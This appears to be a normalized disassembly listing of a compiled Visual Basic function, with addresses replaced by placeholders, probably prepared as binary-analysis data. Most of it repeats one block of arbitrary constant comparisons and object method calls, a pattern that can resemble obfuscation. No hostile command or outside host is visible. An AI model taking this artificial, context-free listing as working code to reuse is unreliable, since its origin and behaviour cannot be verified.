mov ecx [ ebp - 0xe0 ]
push ecx
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x19c ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x19c ] rw-data
jmp r-xdata
lea ecx [ ebp - 0x24 ]
call [ __vbaFreeStr@IAT ]
lea ecx [ ebp - 0x28 ]
call [ __vbaFreeObj@IAT ]
lea ecx [ ebp - 0x2c ]
call [ __vbaFreeStr@IAT ]
lea ecx [ ebp - 0x30 ]
call [ __vbaFreeStr@IAT ]
lea ecx [ ebp - 0x3c ]
call [ __vbaFreeObj@IAT ]
lea ecx [ ebp - 0x50 ]
call [ __vbaFreeVar@IAT ]
lea ecx [ ebp - 0x58 ]
call [ __vbaFreeStr@IAT ]
lea ecx [ ebp - 0x5c ]
call [ __vbaFreeStr@IAT ]
lea ecx [ ebp - 0x6c ]
call [ __vbaFreeVar@IAT ]
lea ecx [ ebp - 0x7c ]
call [ __vbaFreeVar@IAT ]
lea ecx [ ebp - 0x80 ]
call [ __vbaFreeStr@IAT ]
lea ecx [ ebp - 0x84 ]
call [ __vbaFreeStr@IAT ]
lea ecx [ ebp - 0x88 ]
call [ __vbaFreeStr@IAT ]
lea ecx [ ebp - 0x8c ]
call [ __vbaFreeStr@IAT ]
lea ecx [ ebp - 0x90 ]
call [ __vbaFreeStr@IAT ]
lea ecx [ ebp - 0xa0 ]
call [ __vbaFreeVar@IAT ]
lea ecx [ ebp - 0xbc ]
call [ __vbaFreeVar@IAT ]
lea ecx [ ebp - 0xc0 ]
call [ __vbaFreeStr@IAT ]
lea ecx [ ebp - 0xc4 ]
call [ __vbaFreeStr@IAT ]
lea ecx [ ebp - 0xd4 ]
call [ __vbaFreeStr@IAT ]
lea ecx [ ebp - 0xd8 ]
call [ __vbaFreeStr@IAT ]
lea ecx [ ebp - 0xe0 ]
call [ __vbaFreeObj@IAT ]
retn
jmp r-xdata
mov [ ebp - 0x4 ] 0x21
mov edx 0xda25c1a0
neg edx
mov eax 0xcc8
adc eax 0x0
neg eax
mov [ ebp - 0x1c0 ] edx
mov [ ebp - 0x1bc ] eax
mov ecx [ ebp - 0x38 ]
cmp ecx [ ebp - 0x1c0 ]
jne r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x1b4 ]
jne r-xdata
mov [ ebp - 0x4 ] 0x1a
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x1a0 ] 0x0
push 0x54
push r-xdata
mov ecx [ ebp - 0x144 ]
push ecx
mov edx [ ebp - 0x148 ]
push edx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x1a0 ] eax
jmp r-xdata
mov edx [ ebp - 0x19c ]
mov eax [ edx ]
mov [ ebp - 0x144 ] eax
push r-xdata
mov ecx [ ebp - 0x144 ]
mov edx [ ecx ]
mov eax [ ebp - 0x144 ]
push eax
call [ edx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0x25
mov ecx 0x73d288e0
neg ecx
mov edx 0x7c1
adc edx 0x0
neg edx
mov [ ebp - 0x1d0 ] ecx
mov [ ebp - 0x1cc ] edx
mov eax [ ebp - 0x38 ]
cmp eax [ ebp - 0x1d0 ]
jne r-xdata
mov edx [ ebp - 0x34 ]
cmp edx [ ebp - 0x1bc ]
jne r-xdata
mov [ ebp - 0x4 ] 0x1e
push 0x0
push r-xdata
mov ecx [ ebp - 0xe0 ]
push ecx
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x1ac ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x1ac ] rw-data
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x29
cmp [ ebp - 0x38 ] 0x5071f300
jne r-xdata
mov ecx [ ebp - 0x34 ]
cmp ecx [ ebp - 0x1cc ]
jne r-xdata
mov [ ebp - 0x4 ] 0x22
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x1b0 ] 0x0
push 0x54
push r-xdata
mov ecx [ ebp - 0x144 ]
push ecx
mov edx [ ebp - 0x148 ]
push edx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x1b0 ] eax
jmp r-xdata
mov edx [ ebp - 0x1ac ]
mov eax [ edx ]
mov [ ebp - 0x144 ] eax
push r-xdata
mov ecx [ ebp - 0x144 ]
mov edx [ ecx ]
mov eax [ ebp - 0x144 ]
push eax
call [ edx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0x2d
cmp [ ebp - 0x38 ] 0x70c2b3a0
jne r-xdata
cmp [ ebp - 0x34 ] 0x987
jne r-xdata
mov [ ebp - 0x4 ] 0x26
push 0x0
push r-xdata
mov edx [ ebp - 0xe0 ]
push edx
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x1c4 ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x1c4 ] rw-data
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x31
mov edx 0x4dbf4860
neg edx
mov eax 0x711
adc eax 0x0
neg eax
mov [ ebp - 0x1e8 ] edx
mov [ ebp - 0x1e4 ] eax
mov ecx [ ebp - 0x38 ]
cmp ecx [ ebp - 0x1e8 ]
jne r-xdata
cmp [ ebp - 0x34 ] 0x28
jne r-xdata
mov [ ebp - 0x4 ] 0x2a
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x1c8 ] 0x0
push 0x54
push r-xdata
mov edx [ ebp - 0x144 ]
push edx
mov eax [ ebp - 0x148 ]
push eax
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x1c8 ] eax
jmp r-xdata
mov eax [ ebp - 0x1c4 ]
mov ecx [ eax ]
mov [ ebp - 0x144 ] ecx
push r-xdata
mov edx [ ebp - 0x144 ]
mov eax [ edx ]
mov ecx [ ebp - 0x144 ]
push ecx
call [ eax + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0x35
mov ecx 0xe76c0fa0
neg ecx
mov edx 0x209
adc edx 0x0
neg edx
mov [ ebp - 0x1f0 ] ecx
mov [ ebp - 0x1ec ] edx
mov eax [ ebp - 0x38 ]
cmp eax [ ebp - 0x1f0 ]
jne r-xdata
mov edx [ ebp - 0x34 ]
cmp edx [ ebp - 0x1e4 ]
jne r-xdata
mov [ ebp - 0x4 ] 0x2e
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x1d4 ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x1d4 ] rw-data
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x39
mov eax 0x8791480
neg eax
mov ecx 0xfda
adc ecx 0x0
neg ecx
mov [ ebp - 0x200 ] eax
mov [ ebp - 0x1fc ] ecx
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x200 ]
jne r-xdata
mov ecx [ ebp - 0x34 ]
cmp ecx [ ebp - 0x1ec ]
jne r-xdata
mov [ ebp - 0x4 ] 0x32
push 0x0
push r-xdata
mov eax [ ebp - 0xe0 ]
push eax
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x1dc ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x1dc ] rw-data
jmp r-xdata
mov [ ebp - 0x1d8 ] 0x0
push 0x54
push r-xdata
mov edx [ ebp - 0x144 ]
push edx
mov eax [ ebp - 0x148 ]
push eax
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x1d8 ] eax
jmp r-xdata
mov eax [ ebp - 0x1d4 ]
mov ecx [ eax ]
mov [ ebp - 0x144 ] ecx
push r-xdata
mov edx [ ebp - 0x144 ]
mov eax [ edx ]
mov ecx [ ebp - 0x144 ]
push ecx
call [ eax + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0x3d
cmp [ ebp - 0x38 ] 0xa4208330
jne r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x1fc ]
jne r-xdata
mov [ ebp - 0x4 ] 0x36
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x1e0 ] 0x0
push 0x54
push r-xdata
mov eax [ ebp - 0x144 ]
push eax
mov ecx [ ebp - 0x148 ]
push ecx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x1e0 ] eax
jmp r-xdata
mov ecx [ ebp - 0x1dc ]
mov edx [ ecx ]
mov [ ebp - 0x144 ] edx
push r-xdata
mov eax [ ebp - 0x144 ]
mov ecx [ eax ]
mov edx [ ebp - 0x144 ]
push edx
call [ ecx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x41
cmp [ ebp - 0x38 ] 0xc1dea020
jne r-xdata
cmp [ ebp - 0x34 ] 0x393
jne r-xdata
mov [ ebp - 0x4 ] 0x3a
push 0x0
push r-xdata
mov ecx [ ebp - 0xe0 ]
push ecx
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x1f4 ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x1f4 ] rw-data
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x45
cmp [ ebp - 0x38 ] 0x1df8cff0
jne r-xdata
cmp [ ebp - 0x34 ] 0x66b
jne r-xdata
mov [ ebp - 0x4 ] 0x3e
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x1f8 ] 0x0
push 0x54
push r-xdata
mov ecx [ ebp - 0x144 ]
push ecx
mov edx [ ebp - 0x148 ]
push edx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x1f8 ] eax
jmp r-xdata
mov edx [ ebp - 0x1f4 ]
mov eax [ edx ]
mov [ ebp - 0x144 ] eax
push r-xdata
mov ecx [ ebp - 0x144 ]
mov edx [ ecx ]
mov eax [ ebp - 0x144 ]
push eax
call [ edx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0x49
cmp [ ebp - 0x38 ] 0xbcba1480
jne r-xdata
cmp [ ebp - 0x34 ] 0xb73
jne r-xdata
mov [ ebp - 0x4 ] 0x42
push 0x0
push r-xdata
mov eax [ ebp - 0xe0 ]
push eax
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x204 ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x204 ] rw-data
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x4d
cmp [ ebp - 0x38 ] 0x8226fc70
jne r-xdata
cmp [ ebp - 0x34 ] 0x1282
jne r-xdata
mov [ ebp - 0x4 ] 0x46
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x208 ] 0x0
push 0x54
push r-xdata
mov ecx [ ebp - 0x144 ]
push ecx
mov edx [ ebp - 0x148 ]
push edx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x208 ] eax
jmp r-xdata
mov edx [ ebp - 0x204 ]
mov eax [ edx ]
mov [ ebp - 0x144 ] eax
push r-xdata
mov ecx [ ebp - 0x144 ]
mov edx [ ecx ]
mov eax [ ebp - 0x144 ]
push eax
call [ edx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0x51
cmp [ ebp - 0x38 ] 0xd068d920
jne r-xdata
cmp [ ebp - 0x34 ] 0x940
jne r-xdata
mov [ ebp - 0x4 ] 0x4a
push 0x0
push r-xdata
mov edx [ ebp - 0xe0 ]
push edx
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x20c ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x20c ] rw-data
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x55
cmp [ ebp - 0x38 ] 0x269f8930
jne r-xdata
cmp [ ebp - 0x34 ] 0x1e9
jne r-xdata
mov [ ebp - 0x4 ] 0x4e
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x210 ] 0x0
push 0x54
push r-xdata
mov eax [ ebp - 0x144 ]
push eax
mov ecx [ ebp - 0x148 ]
push ecx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x210 ] eax
jmp r-xdata
mov ecx [ ebp - 0x20c ]
mov edx [ ecx ]
mov [ ebp - 0x144 ] edx
push r-xdata
mov eax [ ebp - 0x144 ]
mov ecx [ eax ]
mov edx [ ebp - 0x144 ]
push edx
call [ ecx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0x59
mov eax 0xba94aaf0
neg eax
mov ecx 0x475
adc ecx 0x0
neg ecx
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x224 ] ecx
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x228 ]
jne r-xdata
cmp [ ebp - 0x34 ] 0x6ca
jne r-xdata
mov [ ebp - 0x4 ] 0x52
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x214 ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x214 ] rw-data
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x5d
mov edx 0xa4c0da10
neg edx
mov eax 0xdd4
adc eax 0x0
neg eax
mov [ ebp - 0x238 ] edx
mov [ ebp - 0x234 ] eax
mov ecx [ ebp - 0x38 ]
cmp ecx [ ebp - 0x238 ]
jne r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x224 ]
jne r-xdata
mov [ ebp - 0x4 ] 0x56
push 0x0
push r-xdata
mov edx [ ebp - 0xe0 ]
push edx
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x21c ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x21c ] rw-data
jmp r-xdata
mov [ ebp - 0x218 ] 0x0
push 0x54
push r-xdata
mov edx [ ebp - 0x144 ]
push edx
mov eax [ ebp - 0x148 ]
push eax
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x218 ] eax
jmp r-xdata
mov eax [ ebp - 0x214 ]
mov ecx [ eax ]
mov [ ebp - 0x144 ] ecx
push r-xdata
mov edx [ ebp - 0x144 ]
mov eax [ edx ]
mov ecx [ ebp - 0x144 ]
push ecx
call [ eax + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0x61
cmp [ ebp - 0x38 ] 0x702a19b0
jne r-xdata
mov edx [ ebp - 0x34 ]
cmp edx [ ebp - 0x234 ]
jne r-xdata
mov [ ebp - 0x4 ] 0x5a
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x220 ] 0x0
push 0x54
push r-xdata
mov eax [ ebp - 0x144 ]
push eax
mov ecx [ ebp - 0x148 ]
push ecx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x220 ] eax
jmp r-xdata
mov ecx [ ebp - 0x21c ]
mov edx [ ecx ]
mov [ ebp - 0x144 ] edx
push r-xdata
mov eax [ ebp - 0x144 ]
mov ecx [ eax ]
mov edx [ ebp - 0x144 ]
push edx
call [ ecx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x65
mov edx 0x199f5d50
neg edx
mov eax 0x1007
adc eax 0x0
neg eax
mov [ ebp - 0x248 ] edx
mov [ ebp - 0x244 ] eax
mov ecx [ ebp - 0x38 ]
cmp ecx [ ebp - 0x248 ]
jne r-xdata
cmp [ ebp - 0x34 ] 0x11da
jne r-xdata
mov [ ebp - 0x4 ] 0x5e
push 0x0
push r-xdata
mov eax [ ebp - 0xe0 ]
push eax
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x22c ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x22c ] rw-data
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x69
cmp [ ebp - 0x38 ] 0x73b1ce50
jne r-xdata
mov edx [ ebp - 0x34 ]
cmp edx [ ebp - 0x244 ]
jne r-xdata
mov [ ebp - 0x4 ] 0x62
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x230 ] 0x0
push 0x54
push r-xdata
mov eax [ ebp - 0x144 ]
push eax
mov ecx [ ebp - 0x148 ]
push ecx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x230 ] eax
jmp r-xdata
mov ecx [ ebp - 0x22c ]
mov edx [ ecx ]
mov [ ebp - 0x144 ] edx
push r-xdata
mov eax [ ebp - 0x144 ]
mov ecx [ eax ]
mov edx [ ebp - 0x144 ]
push edx
call [ ecx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0x6d
mov edx 0xb89a60d0
neg edx
mov eax 0x1287
adc eax 0x0
neg eax
mov [ ebp - 0x258 ] edx
mov [ ebp - 0x254 ] eax
mov ecx [ ebp - 0x38 ]
cmp ecx [ ebp - 0x258 ]
jne r-xdata
cmp [ ebp - 0x34 ] 0x11a
jne r-xdata
mov [ ebp - 0x4 ] 0x66
push 0x0
push r-xdata
mov eax [ ebp - 0xe0 ]
push eax
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x23c ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x23c ] rw-data
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x71
mov ecx 0x2a7f6d10
neg ecx
mov edx 0xf7e
adc edx 0x0
neg edx
mov [ ebp - 0x260 ] ecx
mov [ ebp - 0x25c ] edx
mov eax [ ebp - 0x38 ]
cmp eax [ ebp - 0x260 ]
jne r-xdata
mov edx [ ebp - 0x34 ]
cmp edx [ ebp - 0x254 ]
jne r-xdata
mov [ ebp - 0x4 ] 0x6a
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x240 ] 0x0
push 0x54
push r-xdata
mov eax [ ebp - 0x144 ]
push eax
mov ecx [ ebp - 0x148 ]
push ecx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x240 ] eax
jmp r-xdata
mov ecx [ ebp - 0x23c ]
mov edx [ ecx ]
mov [ ebp - 0x144 ] edx
push r-xdata
mov eax [ ebp - 0x144 ]
mov ecx [ eax ]
mov edx [ ebp - 0x144 ]
push edx
call [ ecx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0x75
mov eax 0xc42c3450
neg eax
mov ecx 0xa76
adc ecx 0x0
neg ecx
mov [ ebp - 0x270 ] eax
mov [ ebp - 0x26c ] ecx
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x270 ]
jne r-xdata
mov ecx [ ebp - 0x34 ]
cmp ecx [ ebp - 0x25c ]
jne r-xdata
mov [ ebp - 0x4 ] 0x6e
push 0x0
push r-xdata
mov eax [ ebp - 0xe0 ]
push eax
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x24c ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x24c ] rw-data
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x79
mov edx 0x9000a870
neg edx
mov eax 0x371
adc eax 0x0
neg eax
mov [ ebp - 0x280 ] edx
mov [ ebp - 0x27c ] eax
mov ecx [ ebp - 0x38 ]
cmp ecx [ ebp - 0x280 ]
jne r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x26c ]
jne r-xdata
mov [ ebp - 0x4 ] 0x72
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x250 ] 0x0
push 0x54
push r-xdata
mov eax [ ebp - 0x144 ]
push eax
mov ecx [ ebp - 0x148 ]
push ecx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x250 ] eax
jmp r-xdata
mov ecx [ ebp - 0x24c ]
mov edx [ ecx ]
mov [ ebp - 0x144 ] edx
push r-xdata
mov eax [ ebp - 0x144 ]
mov ecx [ eax ]
mov edx [ ebp - 0x144 ]
push edx
call [ ecx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0x7d
mov ecx 0x6c35af40
neg ecx
mov edx 0x19
adc edx 0x0
neg edx
mov [ ebp - 0x288 ] ecx
mov [ ebp - 0x284 ] edx
mov eax [ ebp - 0x38 ]
cmp eax [ ebp - 0x288 ]
jne r-xdata
mov edx [ ebp - 0x34 ]
cmp edx [ ebp - 0x27c ]
jne r-xdata
mov [ ebp - 0x4 ] 0x76
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x264 ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x264 ] rw-data
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x81
mov eax 0x6e5ae290
neg eax
mov ecx 0x753
adc ecx 0x0
neg ecx
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x294 ] ecx
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x298 ]
jne r-xdata
mov ecx [ ebp - 0x34 ]
cmp ecx [ ebp - 0x284 ]
jne r-xdata
mov [ ebp - 0x4 ] 0x7a
push 0x0
push r-xdata
mov eax [ ebp - 0xe0 ]
push eax
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x274 ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x274 ] rw-data
jmp r-xdata
mov [ ebp - 0x268 ] 0x0
push 0x54
push r-xdata
mov ecx [ ebp - 0x144 ]
push ecx
mov edx [ ebp - 0x148 ]
push edx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x268 ] eax
jmp r-xdata
mov edx [ ebp - 0x264 ]
mov eax [ edx ]
mov [ ebp - 0x144 ] eax
push r-xdata
mov ecx [ ebp - 0x144 ]
mov edx [ ecx ]
mov eax [ ebp - 0x144 ]
push eax
call [ edx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0x85
mov edx 0x80782c0
neg edx
mov eax 0x24c
adc eax 0x0
neg eax
mov [ ebp - 0x2a0 ] edx
mov [ ebp - 0x29c ] eax
mov ecx [ ebp - 0x38 ]
cmp ecx [ ebp - 0x2a0 ]
jne r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x294 ]
jne r-xdata
mov [ ebp - 0x4 ] 0x7e
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x278 ] 0x0
push 0x54
push r-xdata
mov eax [ ebp - 0x144 ]
push eax
mov ecx [ ebp - 0x148 ]
push ecx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x278 ] eax
jmp r-xdata
mov ecx [ ebp - 0x274 ]
mov edx [ ecx ]
mov [ ebp - 0x144 ] edx
push r-xdata
mov eax [ ebp - 0x144 ]
mov ecx [ eax ]
mov edx [ ebp - 0x144 ]
push edx
call [ ecx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x89
cmp [ ebp - 0x38 ] 0xc6c42210
jne r-xdata
mov edx [ ebp - 0x34 ]
cmp edx [ ebp - 0x29c ]
jne r-xdata
mov [ ebp - 0x4 ] 0x82
push 0x0
push r-xdata
mov ecx [ ebp - 0xe0 ]
push ecx
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x28c ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x28c ] rw-data
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x8d
cmp [ ebp - 0x38 ] 0x8c310a00
jne r-xdata
cmp [ ebp - 0x34 ] 0xefc
jne r-xdata
mov [ ebp - 0x4 ] 0x86
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x290 ] 0x0
push 0x54
push r-xdata
mov ecx [ ebp - 0x144 ]
push ecx
mov edx [ ebp - 0x148 ]
push edx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x290 ] eax
jmp r-xdata
mov edx [ ebp - 0x28c ]
mov eax [ edx ]
mov [ ebp - 0x144 ] eax
push r-xdata
mov ecx [ ebp - 0x144 ]
mov edx [ ecx ]
mov eax [ ebp - 0x144 ]
push eax
call [ edx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0x91
mov eax 0x5ebd1950
neg eax
mov ecx 0x1a6
adc ecx 0x0
neg ecx
mov [ ebp - 0x2b8 ] eax
mov [ ebp - 0x2b4 ] ecx
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x2b8 ]
jne r-xdata
cmp [ ebp - 0x34 ] 0x5ba
jne r-xdata
mov [ ebp - 0x4 ] 0x8a
push 0x0
push r-xdata
mov ecx [ ebp - 0xe0 ]
push ecx
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x2a4 ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x2a4 ] rw-data
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x95
cmp [ ebp - 0x38 ] 0xed360680
jne r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x2b4 ]
jne r-xdata
mov [ ebp - 0x4 ] 0x8e
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x2a8 ] 0x0
push 0x54
push r-xdata
mov edx [ ebp - 0x144 ]
push edx
mov eax [ ebp - 0x148 ]
push eax
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x2a8 ] eax
jmp r-xdata
mov eax [ ebp - 0x2a4 ]
mov ecx [ eax ]
mov [ ebp - 0x144 ] ecx
push r-xdata
mov edx [ ebp - 0x144 ]
mov eax [ edx ]
mov ecx [ ebp - 0x144 ]
push ecx
call [ eax + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0x99
mov eax 0xb08ac470
neg eax
mov ecx 0x7fb
adc ecx 0x0
neg ecx
mov [ ebp - 0x2c8 ] eax
mov [ ebp - 0x2c4 ] ecx
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x2c8 ]
jne r-xdata
cmp [ ebp - 0x34 ] 0x339
jne r-xdata
mov [ ebp - 0x4 ] 0x92
push 0x0
push r-xdata
mov ecx [ ebp - 0xe0 ]
push ecx
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x2ac ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x2ac ] rw-data
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x9d
cmp [ ebp - 0x38 ] 0x4c322380
jne r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x2c4 ]
jne r-xdata
mov [ ebp - 0x4 ] 0x96
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x2b0 ] 0x0
push 0x54
push r-xdata
mov ecx [ ebp - 0x144 ]
push ecx
mov edx [ ebp - 0x148 ]
push edx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x2b0 ] eax
jmp r-xdata
mov edx [ ebp - 0x2ac ]
mov eax [ edx ]
mov [ ebp - 0x144 ] eax
push r-xdata
mov ecx [ ebp - 0x144 ]
mov edx [ ecx ]
mov eax [ ebp - 0x144 ]
push eax
call [ edx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0xa1
cmp [ ebp - 0x38 ] 0x8a342740
jne r-xdata
cmp [ ebp - 0x34 ] 0xb55
jne r-xdata
mov [ ebp - 0x4 ] 0x9a
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x2bc ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x2bc ] rw-data
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0xa5
cmp [ ebp - 0x38 ] 0xe6001000
jne r-xdata
cmp [ ebp - 0x34 ] 0xe7b
jne r-xdata
